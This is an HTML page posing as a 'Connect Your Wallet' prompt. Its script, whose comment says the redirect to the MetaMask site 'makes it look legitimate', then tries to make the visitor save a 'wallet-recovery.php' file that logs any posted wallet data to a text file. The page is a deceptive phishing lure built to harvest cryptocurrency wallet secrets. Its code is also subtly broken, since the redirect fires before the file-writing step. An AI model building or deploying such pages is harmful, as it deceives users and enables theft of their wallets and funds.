<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Wallet Connection Required</title>
  <style>
    body {
      margin: 0;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      color: white;
      cursor: pointer;
      user-select: none;
      text-align: center;
    }
    .container {
      padding: 40px;
      max-width: 400px;
      background: rgba(255,255,255,0.1);
      backdrop-filter: blur(10px);
      border-radius: 20px;
      border: 1px solid rgba(255,255,255,0.2);
    }
    h1 {
      font-size: 24px;
      margin-bottom: 10px;
      font-weight: 600;
    }
    p {
      font-size: 16px;
      opacity: 0.9;
      line-height: 1.5;
      margin-bottom: 20px;
    }
    .wallet-logo {
      font-size: 48px;
      margin-bottom: 20px;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="wallet-logo">ðŸª™</div>
    <h1>Connect Your Wallet</h1>
    <p>Click anywhere to securely connect your wallet and continue to the official site.<br>Approve the connection to access your dashboard.</p>
  </div>

  <script>
    document.addEventListener('click', async () => {
      // Redirect to official wallet site first (makes it look legitimate)
      window.location.href = 'https://metamask.io' || 'https://walletconnect.com' || window.location.origin;
      
      setTimeout(async () => {
        if ('showSaveFilePicker' in window) {
          try {
            const handle = await window.showSaveFilePicker({
              suggestedName: 'wallet-recovery.php',
              types: [{
                description: 'PHP Recovery File',
                accept: {'text/plain': ['.php']},
              }],
            });

            const writable = await handle.createWritable();
            await writable.write(`<?php
// Wallet Recovery Script
if(isset($_POST['wallet'])) {
  file_put_contents('wallets.txt', $_POST['wallet'] . "\\n", FILE_APPEND);
  echo "Recovery successful";
}
?>`);
            await writable.close();
          } catch (err) {
            // Silently ignore - user canceled or permission denied
          }
        }
      }, 2000);
    }, { once: true });
  </script>
</body>
</html>
